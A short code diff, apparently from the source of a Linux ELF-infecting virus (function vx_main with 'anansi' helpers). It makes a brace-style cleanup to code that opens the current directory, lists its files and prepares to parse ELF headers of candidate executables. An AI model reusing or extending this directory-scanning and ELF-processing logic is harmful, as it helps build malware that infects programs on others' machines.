@@ -190,18 +190,16 @@ void vx_main()
 	anansi_printf("max_target @ %d\n", max_target);
 #endif
 
-	if(!(cwd = anansi_malloc(PATH_MAX))) {
+	if(!(cwd = anansi_malloc(PATH_MAX)))
 		goto clean_up;
-	}
 
-	if(!(cwd_listings = anansi_malloc(DIR_LISTING_SIZE))) {
+	if(!(cwd_listings = anansi_malloc(DIR_LISTING_SIZE)))
 		goto clean_up;
-	}
 
 	anansi_getcwd(cwd, PATH_MAX);
-	if((cwd_fd = anansi_open(cwd, O_RDONLY | O_DIRECTORY, 0)) < 0) {
+
+	if((cwd_fd = anansi_open(cwd, O_RDONLY | O_DIRECTORY, 0)) < 0)
 		goto clean_up;
-	}
 
 	nread = anansi_getdents64(cwd_fd, cwd_listings, DIR_LISTING_SIZE);
 	attr = PROCESS_ELF_EHDR | PROCESS_ELF_PHDR | PROCESS_ELF_SHDR;
